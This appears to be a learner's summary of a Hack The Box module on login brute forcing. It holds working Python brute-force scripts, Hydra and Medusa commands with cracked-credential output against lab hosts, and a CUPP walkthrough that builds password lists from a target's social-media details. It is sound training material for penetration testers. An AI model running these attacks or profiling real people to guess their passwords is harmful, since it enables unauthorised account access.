# HTB: Loing Brute Forcing Summary

Module Link: https://academy.hackthebox.com/app/module/57

## Introduction

**Types of Brute Forcing**

Brute forcing is not a monolithic entity but a collection of diverse techniques, each with its strengths, weaknesses, and ideal use cases. Understanding these variations is crucial for both attackers and defenders, as it enables the former to choose the most effective approach and the latter to implement targeted countermeasures. The following table provides a comparative overview of various brute-forcing methods:

| **Method** | **Description** | **Example** | **Best Used When...** |
| --- | --- | --- | --- |
| `Simple Brute Force` | Systematically tries all possible combinations of characters within a defined character set and length range. | Trying all combinations of lowercase letters from 'a' to 'z' for passwords of length 4 to 6. | No prior information about the password is available, and computational resources are abundant. |
| `Dictionary Attack` | Uses a pre-compiled list of common words, phrases, and passwords. | Trying passwords from a list like 'rockyou.txt' against a login form. | The target will likely use a weak or easily guessable password based on common patterns. |
| `Hybrid Attack` | Combines elements of simple brute force and dictionary attacks, often appending or prepending characters to dictionary words. | Adding numbers or special characters to the end of words from a dictionary list. | The target might use a slightly modified version of a common password. |
| `Credential Stuffing` | Leverages leaked credentials from one service to attempt access to other services, assuming users reuse passwords. | Using a list of usernames and passwords leaked from a data breach to try logging into various online accounts. | A large set of leaked credentials is available, and the target is suspected of reusing passwords across multiple services. |
| `Password Spraying` | Attempts a small set of commonly used passwords against a large number of usernames. | Trying passwords like 'password123' or 'qwerty' against all usernames in an organization. | Account lockout policies are in place, and the attacker aims to avoid detection by spreading attempts across multiple accounts. |
| `Rainbow Table Attack` | Uses pre-computed tables of password hashes to reverse hashes and recover plaintext passwords quickly. | Pre-computing hashes for all possible passwords of a certain length and character set, then comparing captured hashes against the table to find matches. | A large number of password hashes need to be cracked, and storage space for the rainbow tables is available. |
| `Reverse Brute Force` | Targets a single password against multiple usernames, often used in conjunction with credential stuffing attacks. | Using a leaked password from one service to try logging into multiple accounts with different usernames. | A strong suspicion exists that a particular password is being reused across multiple accounts. |
| `Distributed Brute Force` | Distributes the brute forcing workload across multiple computers or devices to accelerate the process. | Using a cluster of computers to perform a brute-force attack significantly increases the number of combinations that can be tried per second. | The target password or key is highly complex, and a single machine lacks the computational power to crack it within a reasonable timeframe. |

**The Role of Brute Forcing in Penetration Testing**

While penetration tests encompass a range of techniques, brute forcing is often strategically employed when:

- `Other avenues are exhausted`: Initial attempts to gain access, such as exploiting known vulnerabilities or utilizing social engineering tactics, may prove unsuccessful. In such scenarios, brute forcing is a viable alternative to overcome password barriers.
- `Password policies are weak`: If the target system employs lax password policies, it increases the likelihood of users having weak or easily guessable passwords. Brute forcing can effectively expose these vulnerabilities.
- `Specific accounts are targeted`: In some instances, penetration testers may focus on compromising specific user accounts, such as those with elevated privileges. Brute forcing can be tailored to target these accounts directly.

## Brute Force Attacks

To truly grasp the challenge of brute forcing, it's essential to understand the underlying mathematics. The following formula determines the total number of possible combinations for a password:

```
Possible Combinations = Character Set Size^Password Length
```

Let's consider a few scenarios to illustrate the impact of password length and character set on the search space:

|  | Password Length | Character Set | Possible Combinations |
| --- | --- | --- | --- |
| `Short and Simple` | 6 | Lowercase letters (a-z) | 26^6 = 308,915,776 |
| `Longer but Still Simple` | 8 | Lowercase letters (a-z) | 26^8 = 208,827,064,576 |
| `Adding Complexity` | 8 | Lowercase and uppercase letters (a-z, A-Z) | 52^8 = 53,459,728,531,456 |
| `Maximum Complexity` | 12 | Lowercase and uppercase letters, numbers, and symbols | 94^12 = 475,920,493,781,698,549,504 |

The more powerful the attacker's hardware (e.g., the number of GPUs, CPUs, or cloud-based computing resources they can utilize), the more password guesses they can make per second. While a complex password can take years to brute-force with a single machine, a sophisticated 
attacker using a distributed network of high-performance computing resources could reduce that time drastically.

 ![ALT](/HTB/Web_Penetration_Tester/Login_Brute_Forcing/Images/1.png)

The above chart illustrates an exponential relationship between password complexity and cracking time. As the password length increases and the character set expands, the total number of possible combinations grows exponentially. This significantly increases the time required to crack the password, even with powerful computing resources.Comparing the basic computer and the supercomputer:

- Basic Computer (1 million passwords/second): Adequate for cracking simple passwords quickly but becomes impractically slow for complex passwords. For instance, cracking an 8-character password using letters and digits would take approximately 6.92 years.
- Supercomputer (1 trillion passwords/second): Drastically reduces cracking times for simpler passwords. However, even with this immense power, cracking highly complex passwords can take an impractical amount of time. For example, a 12-character password with all ASCII characters would still take about 15000 years to crack.

### **Cracking the PIN**

Cracking PIN password

```php
$ curl http://94.237.120.137:33112/pin?pin=3333
{"message":"Incorrect PIN!"}
```

A simple demonstration Python script to brute-force the `/pin` endpoint on the API

```python
import requests 

for pin in range(10000):
	formatted_pin= f"{pin:04d}" # convert the number to 4-digit string
	# send request
	URL = f"http://94.237.120.137:33112/pin?pin={formatted_pin}"
	print("Trying...:",URL)
	response= requests.get(URL)

	# check correct pin
	if response.ok and "Incorrect PIN!" not in response.json():
		print(f"Correct PIN Found! {formatted_pin}")
		print(f"Flag: {response.json()}")
		break
```

And finally! after two hours we found the right match:

```python
Trying...: http://94.237.120.137:33112/pin?pin=5730
Trying...: http://94.237.120.137:33112/pin?pin=5731
Correct PIN Found! 5731
Flag: {'flag': 'HTB{Brut3_F0rc3_1s_P0w3rfu1}', 'message': 'Correct PIN!'}
```

### Dictionary Attacks

**Building and Utilizing Wordlists**

- **Public Repositories:** Readily available collections like **SecLists** that house common passwords and leaked data.
- **Custom-Built:** Tailored lists created by testers using reconnaissance data (interests, names, or hobbies) specific to a target.
- **Specialized:** Context-specific lists focused on certain industries or software types.
- **Pre-packaged:** Standard lists found within security operating systems (e.g., ParrotSec), such as the famous `rockyou.txt`.

**Essential Wordlists for Login Audits**

| Wordlist | Focus | Primary Use Case |
| --- | --- | --- |
| **rockyou.txt** | Millions of leaked passwords | High-volume password cracking |
| **top-usernames-shortlist** | Most common usernames | Quick, high-probability probes |
| **xato-net-10-million** | Extensive username list | Deep-dive credential discovery |
| **2023-200_most_used** | Current trending passwords | Targeting low-hanging fruit/weak security |
| **default-passwords.txt** | Factory/Vendor credentials | Auditing routers, IoT, and software |

**Example:** The instance application creates a route (`/dictionary`) that handles POST requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. If there's a match, it responds with a JSON object containing a success message and the flag. Otherwise, it returns an error message with a 401 status code (Unauthorized). 

```python
import requests

URL = "http://83.136.253.132:54953/dictionary"
with open('/usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt','r')as file:
	
	for passwd in file:
		passwd = passwd.strip()
		print(f"Attampting password: {passwd}")
		
		response = requests.post(URL, data={'password': passwd})

		if response.ok and "Incorrect password" not in response.json():
			print(f"Password Found! {passwd}")
			print(f"Flag: {response.json()['flag']}")
			break
```

result:

```python
Attampting password: bear
Attampting password: tiger
Attampting password: doctor
Attampting password: gateway
Password Found! gateway
Flag: HTB{Brut3_F0rc3_M4st3r}
```

### Hybrid Attacks

Hybrid attacks combine the **speed** of a dictionary attack with the **coverage** of a brute-force attack.

- **The Problem:** Rigid password policies (e.g., "change your password every 90 days") often lead users to create "predictable evolutions" (e.g., `Password123` becomes `Password124!`).
- **The Attack Logic:**
    1. **Dictionary Phase:** Try a base word (e.g., `Company2023`).
    2. **Brute-Force/Rule Phase:** Automatically apply variations to that base word (appending `!`, `?`, or changing the year to `2024`).
- **The Advantage:** It is much faster than a pure brute-force attack because it doesn't waste time on nonsense combinations like `qxZ#9!`. It only tests variations that humans are likely to use.

---

**Hybrid Attacks in Action:** Let's illustrate this with a practical example. Consider an attacker 
targeting an organization known to enforce regular password changes.

 ![ALT](/HTB/Web_Penetration_Tester/Login_Brute_Forcing/Images/2.png)

The attacker begins by launching a dictionary attack, using a wordlist curated with common passwords, industry-specific terms, and potentially personal information related to the organization or its employees. This phase attempts to quickly identify any low-hanging fruit - accounts protected by weak or easily guessable passwords.

---

**Applying Logic to the Scenario:** If you are targeting the organization mentioned with the **8-character / Upper / Lower / Number** policy, a standard wordlist of "common passwords" might fail if it contains simple words like `sunshine`.

A **Hybrid Attack** would take `sunshine` and automatically transform it into candidates that meet the policy:

- `Sunshine1`
- `Sunshine2024`
- `Suns#ine!2`

To extract only the passwords that adhere to this policy, we can leverage the powerful command-line tools available on most Linux/Unix-based systems by default, specifically `grep` paired with regex. We are going to use the [darkweb2017-top10000.txt ](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt)password list for this.

```python
# grep 8-character long
grep -E '^.{8,}$' /usr/share/wordlists/SecLists/Passwords/Common-Credentials/darkweb2017_top-10000.txt > darkweb2017-miniklength.txt 

# grep uppercase
 grep -E '[A-Z]' darkweb2017-miniklength.txt > darkweb2017-uppercase.txt

# grep lowercase
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt

# grep numbers
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-numbers.txt
```

final wordlist:

```python
$ head darkweb2017-numbers.txt                           
j38ifUbn
3rJs1la7qE
iw14Fi9j
Sojdlg123aljg
Password1
PolniyPizdec0211
a838hfiD
uQA9Ebw445
YAgjecc826
1v7Upjw3nT
```

By filtering according to the target password policies,  we are narrowing the search from 9999 words to 89 words!

---

**Credential Stuffing: Leveraging Stolen Data for Unauthorized Access**

 ![ALT](/HTB/Web_Penetration_Tester/Login_Brute_Forcing/Images/3.png)

Credential stuffing attacks exploit the unfortunate reality that many users reuse passwords across multiple online accounts. This pervasive practice, often driven by the desire for convenience and the challenge of managing numerous unique credentials, creates a fertile ground for attackers to exploit.

## Hydra

Hydra's basic syntax is:

```bash
$ hydra [login_options] [password_options] [attack_options] [service_options]
```

| Parameter | Explanation | Usage Example |
| --- | --- | --- |
| `-l LOGIN` or `-L FILE` | Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`). | `hydra -l admin ...` or `hydra -L usernames.txt ...` |
| `-p PASS` or `-P FILE` | Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`). | `hydra -p password123 ...` or `hydra -P passwords.txt ...` |
| `-t TASKS` | Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack. | `hydra -t 4 ...` |
| `-f` | Fast mode: Stop the attack after the first successful login is found. | `hydra -f ...` |
| `-s PORT` | Port: Specify a non-default port for the target service. | `hydra -s 2222 ...` |
| `-v` or `-V` | Verbose output: Display detailed information about the attack's progress, including attempts and results. | `hydra -v ...` or `hydra -V ...` (for even more verbosity) |
| `service://server` | Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname. | `hydra ssh://192.168.1.100` |
| `/OPT` | Service-specific options: Provide any additional options required by the target service. | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication) |

**Targeting Multiple SSH Servers:** Consider a situation where you have identified several servers that may be vulnerable to SSH brute-force attacks. You compile their IP addresses into a file named `targets.txt` and know that these servers might use the default username "root" and password "toor." To efficiently test all these servers simultaneously, use the following Hydra command:

```bash
 hydra -l root -p toor -M targets.txt ssh
```

---

### Brute-Forcing a Web Login Form

Suppose you are tasked with brute-forcing a login form on a web application at `www.example.com`. You know the username is "admin," and the form parameters for the login are `user=^USER^&pass=^PASS^`. To perform this attack, use the following Hydra command:

Hydra

```bash
aishaxx@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

This command instructs Hydra to:

- Use the username "admin".
- Use the list of passwords from the `passwords.txt` file.
- Target the login form at `/login` on `www.example.com`.
- Employ the `http-post-form` module with the specified form parameters.
- Look for a successful login indicated by the HTTP status code `302`.

---

**Advanced RDP Brute-Forcing:** Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:

```bash
$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

This command instructs Hydra to:

- Use the username "administrator".
- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
- Target the RDP service on `192.168.1.100`.
- Employ the `rdp` module for the attack.

### Basic HTTP Authentication

Brute forcing a basic http authentication

 ![ALT](/HTB/Web_Penetration_Tester/Login_Brute_Forcing/Images/4.png)

For example, the headers for Basic Auth in a HTTP GET request would look like:

```
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

```bash
echo "YWxpY2U6c2VjcmV0MTIz" | base64 -d
alice:secret123   
```

```bash
$ hydra -l basic-auth-user -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 83.136.248.107 http-get / -s 49215 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-01 12:11:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://83.136.248.107:49215/
[49215][http-get] host: 83.136.248.107   login: basic-auth-user   password: Password@123                                                                          
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-01 12:11:08
```

Let's break down the command:

- `l basic-auth-user`: This specifies that the username for the login attempt is 'basic-auth-user'.
- `P 2023-200_most_used_passwords.txt`: This indicates that Hydra should use the password list contained in the file '2023-200_most_used_passwords.txt' for its brute-force attack.
- `83.136.248.107`: This is the target IP address.
- `http-get /`: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/').
- `s 49215`: This overrides the default port for the HTTP service and sets it to 49215.

### Login Forms

**A Basic Login Form Example:** Most login forms follow a similar structure. Here's an example:

```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>

```

This form, when submitted, sends a POST request to the `/login` endpoint on the server, including the entered username and password as form data.

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

- The `POST` method indicates that data is being sent to the server to create or update a resource.
- `/login` is the URL endpoint handling the login request.
- The `Content-Type` header specifies how the data is encoded in the request body.
- The `Content-Length` header indicates the size of the data being sent.
- The request body contains the username and password, encoded as key-value pairs.

When a user interacts with a login form, their browser handles the initial processing. The browser captures the entered credentials, often employing JavaScript for client-side validation or input sanitization. Upon submission, the browser constructs an HTTP POST request. This request encapsulates the form data—including the username and password—within its body, often encoded as `application/x-www-form-urlencoded` or `multipart/form-data`.

---

**http-post-form:** Hydra's `http-post-form` service is specifically designed to target login forms. It enables the automation of POST requests, dynamically inserting username and password combinations into the request body. By leveraging Hydra's capabilities, attackers can efficiently test numerous credential combinations against a login form, potentially uncovering valid logins.The general structure of a Hydra command using `http-post-form` looks like this:

```bash
hydra [options] target http-post-form "path:params:condition_string"
```

**Understanding the Condition String:** In Hydra’s `http-post-form` module, success and failure conditions are crucial for properly identifying valid and invalid login attempts.

- `F=...` → For failure condition
- `S=...` → For successful condition

For example: Filter results based on failure response (`Invalid credentials`)

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

or success

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

In this case, Hydra will treat any response that returns an HTTP 302 status code as a successful login. Similarly, if a successful login results in content like "Dashboard" appearing on the page, you can configure Hydra to look for that keyword as a success condition:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

---

Before unleashing Hydra on a login form, it's essential to gather intelligence on its inner workings. This involves pinpointing the exact parameters the form uses to transmit the username and password to the server.

1. **in the network tab of the devtools** 

 ![ALT](/HTB/Web_Penetration_Tester/Login_Brute_Forcing/Images/5.png)

```bash
username=test&password=test
```

1. **or in the page source**

```html
<form method="POST">
        <h2>Login</h2>
        <label for="username">Username:</label>
        <input type="text" id="username" name="username">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password">
        <input type="submit" value="Login">
        
            <p class="error">Invalid credentials</p>
        
    </form>
```

The HTML reveals a simple login form. Key points for Hydra:

- `Method`: `POST` - Hydra will need to send POST requests to the server.
- Fields:
    - `Username`: The input field named `username` will be targeted.
    - `Password`: The input field named `password` will be targeted.

With these details, you can construct the Hydra command to automate the brute-force attack against this login form.

1. **Proxy Interception**

---

**Constructing the params String for Hydra:** The `params` string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.

- `Form Parameters`: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (`^USER^` and `^PASS^`) within these parameters with values from your wordlists.
- `Additional Fields`: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the `params` string. These can have static values or dynamic placeholders if their values change with each request.
- `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like `S=302` for a redirect) or the presence or absence of specific text in the server's response (e.g., `F=Invalid credentials` or `S=Welcome`).

Let's apply this to our scenario. We've discovered:

- The form submits data to the root path (`/`).
- The username field is named `username`.
- The password field is named `password`.
- An error message "Invalid credentials" is displayed upon failed login.

Therefore, our `params` string would be:

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

**Crafting the attack:** 

```bash
$ hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f 83.136.248.107 -s 54208 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" 

...
[DATA] attacking http-post-form://83.136.248.107:54208/:username=^USER^&password=^PASS^:F=Invalid credentials
[54208][http-post-form] host: 83.136.248.107   login: admin   password: zxcvbnm

```

## **Medusa**

## Command Syntax and Parameter Table

Medusa's command-line interface is straightforward. It allows users to specify hosts, users, passwords, and modules with various options to fine-tune the attack process.

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

| Parameter | Explanation | Usage Example |
| --- | --- | --- |
| `-h HOST` or `-H FILE` | Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`). | `medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...` |
| `-u USERNAME` or `-U FILE` | Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`). | `medusa -u admin ...` or `medusa -U usernames.txt ...` |
| `-p PASSWORD` or `-P FILE` | Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`). | `medusa -p password123 ...` or `medusa -P passwords.txt ...` |
| `-M MODULE` | Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`). | `medusa -M ssh ...` |
| `-m "MODULE_OPTION"` | Module options: Provide additional parameters required by the chosen module, enclosed in quotes. | `medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length:
 30\r\nContent-Type: 
application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^"
 ...` |
| `-t TASKS` | Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack. | `medusa -t 4 ...` |
| `-f` or `-F` | Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`). | `medusa -f ...` or `medusa -F ...` |
| `-n PORT` | Port: Specify a non-default port for the target service. | `medusa -n 2222 ...` |
| `-v LEVEL` | Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output. | `medusa -v 4 ...` |

### Medusa Modules

Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of 
commonly used modules:

| Medusa Module | Service/Protocol | Description | Usage Example |
| --- | --- | --- | --- |
| FTP | File Transfer Protocol | Brute-forcing FTP login credentials, used for file transfers over a network. | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt` |
| HTTP | Hypertext Transfer Protocol | Brute-forcing login forms on web applications over HTTP (GET/POST). | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers. | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt` |
| MySQL | MySQL Database | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt` |
| POP3 | Post Office Protocol 3 | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server. | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt` |
| RDP | Remote Desktop Protocol | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems. | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt` |
| SSHv2 | Secure Shell (SSH) | Brute-forcing SSH logins, commonly used for secure remote access. | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt` |
| Subversion (SVN) | Version Control System | Brute-forcing Subversion (SVN) repositories for version control. | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt` |
| Telnet | Telnet Protocol | Brute-forcing Telnet services for remote command execution on older systems. | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt` |
| VNC | Virtual Network Computing | Brute-forcing VNC login credentials for remote desktop access. | `medusa -M vnc -h 192.168.1.100 -P passwords.txt` |
| Web Form | Brute-forcing Web Login Forms | Brute-forcing login forms on websites using HTTP POST requests. | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"` |

**Targeting Multiple Web Servers with Basic HTTP Authentication:** Suppose you have a list of web servers that use basic HTTP authentication. These servers' addresses are stored in `web_servers.txt`, and you also have lists of common usernames and passwords in `usernames.txt` and `passwords.txt`, respectively. To test these servers concurrently, execute:

```bash
 medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

**Testing for Empty or Default Passwords:** If you want to assess whether any accounts on a specific host (`10.0.0.5`) have empty or default passwords (where the password matches the username), you can use:

```bash
$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

This command instructs Medusa to:

- Target the host at `10.0.0.5`.
- Use the usernames from `usernames.txt`.
- Perform additional checks for empty passwords (`e n`) and passwords matching the username (`e s`).
- Use the appropriate service module (replace `service_name` with the correct module name).

Medusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.

---

### Web Services

**Targeting SSH service** 

```bash
medusa -h 94.237.59.242 -n 37529 -u sshuser -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -M ssh -t 3

ACCOUNT CHECK: [ssh] Host: 94.237.59.242 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1q2w3e4r5t (47 of 200 complete)
ACCOUNT FOUND: [ssh] Host: 94.237.59.242 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
ACCOUNT CHECK: [ssh] Host: 94.237.59.242 (1 of 1, 0 complete) User: sshuser (1 of 1, 1 complete) Password: 11111111 (48 of 200 complete)
ACCOUNT CHECK: [ssh] Host: 94.237.59.242 (1 of 1, 0 complete) User: sshuser (1 of 1, 1 complete) Password: Admin@123 (49 of 200 complete)
```

- `M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
- `t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack
but may also increase the likelihood of detection or triggering security measures on the target system.

**Success Result:**

```bash
ACCOUNT FOUND: [ssh] Host: 94.237.59.242 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

Login to the target using the ssh credentials found: 

```bash
ssh sshuser@94.237.59.242 -p 37529
```

**Expanding the Attack Surface:** Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.

```bash
sshuser@ng-1742988-loginbfservice-utzsi-55bd7864d7-2lfc8:/$ id
uid=1000(sshuser) gid=1000(sshuser) groups=1000(sshuser)
sshuser@ng-1742988-loginbfservice-utzsi-55bd7864d7-2lfc8:/$ netstat -tulpn | grep LISTEN
(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -   
```

Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.

```bash
sshuser@ng-1742988-loginbfservice-utzsi-55bd7864d7-2lfc8:/$ nmap localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-01 10:51 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000031s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

---

**Targeting the FTP Server:** Having identified the FTP server, you can proceed to brute-force its authentication mechanism. If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:

```bash
sshuser@ng-1742988-loginbfservice-utzsi-55bd7864d7-2lfc8:/$ ls /home
ftpuser  sshuser
```

Crafting the attack: 

```bash
sshuser@ng-1742988-loginbfservice-utzsi-55bd7864d7-2lfc8:~$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5 
```

success result:

```bash
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
```

accessing the ftp server on the target machine

```bash
sshuser@ng-1742988-loginbfservice-utzsi-55bd7864d7-2lfc8:~$ ftp ftp://ftpuser:qqww1122@localhost
Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
```

## Custom Wordlist

### Username Anarchy

Even when dealing with a seemingly simple name like "Jane Smith," manual username generation can quickly become a convoluted endeavor. While the obvious combinations like `jane`, `smith`, `janesmith`, `j.smith`, or `jane.s` may seem adequate, they barely scratch the surface of the potential username landscape. clone this repository 

```bash
$ ./username-anarchy Jane Smith > ../Jane-usernames.txt

$ head ../Jane-usernames.txt 
jane
janesmith
jane.smith
janesmit
janes
j.smith
jsmith
sjane
s.jane
smithj
```

### CUPP

With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where `CUPP`(Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.

The efficacy of CUPP hinges on the quality and depth of the information you feed it. It's akin to a detective piecing together a suspect's profile - the more clues you have, the clearer the picture 
becomes. **So, where can one gather this valuable intelligence for a target like Jane Smith?**

- `Social Media`: A goldmine of personal details:birthdays, pet names, favorite quotes, travel destinations, significant others, and more. Platforms like Facebook, Twitter, Instagram, and
LinkedIn can reveal much information.
- `Company Websites`: Jane's current or past employers' websites might list her name, position, and even her professional bio,offering insights into her work life.
- `Public Records`: Depending on jurisdiction and privacy laws, public records might divulge details about Jane's address, family members, property ownership, or even past legal entanglements.
- `News Articles and Blogs`: Has Jane been featured in any news articles or blog posts? These could shed light on her interests,achievements, or affiliations.

OSINT will be a goldmine of information for CUPP. Provide as much information as possible; CUPP's effectiveness hinges on the depth of your intelligence. For example, let's say you have put together this profile based on Jane Smith's Facebook postings.

| Field | Details |
| --- | --- |
| Name | Jane Smith |
| Nickname | Janey |
| Birthdate | December 11, 1990 |
| Relationship Status | In a relationship with Jim |
| Partner's Name | Jim (Nickname: Jimbo) |
| Partner's Birthdate | December 12, 1990 |
| Pet | Spot |
| Company | AHI |
| Interests | Hackers, Pizza, Golf, Horses |
| Favorite Colors | Blue |

CUPP will then take your inputs and create a comprehensive list of potential passwords:

- Original and Capitalized: `jane`, `Jane`
- Reversed Strings: `enaj`, `enaJ`
- Birthdate Variations: `jane1994`, `smith2708`
- Concatenations: `janesmith`, `smithjane`
- Appending Special Characters: `jane!`, `smith@`
- Appending Numbers: `jane123`, `smith2024`
- Leetspeak Substitutions: `j4n3`, `5m1th`
- Combined Mutations: `Jane1994!`, `smith2708@`

This process results in a highly personalized wordlist, significantly more likely to contain Jane's actual password than any generic, off-the-shelf dictionary could ever hope to achieve. This focused 
approach dramatically increases the odds of success in our password-cracking endeavors.

```bash
$ cupp -i                            

 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990

> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990

> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 

> Pet's name: Spot
> Company name: AHI

> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: Y
> Do you want to add some random numbers at the end of words? Y/[N]:Y
> Leet mode? (i.e. leet = 1337) Y/[N]: Y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

We now have a generated a username list (`jane_smith_usernames.txt`) and a password list (`jane.txt`),but there is one more thing we need to deal with. CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy.

- Minimum Length: 6 characters
- Must Include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number
    - At least two special characters (from the set `!@#$%^&*`)

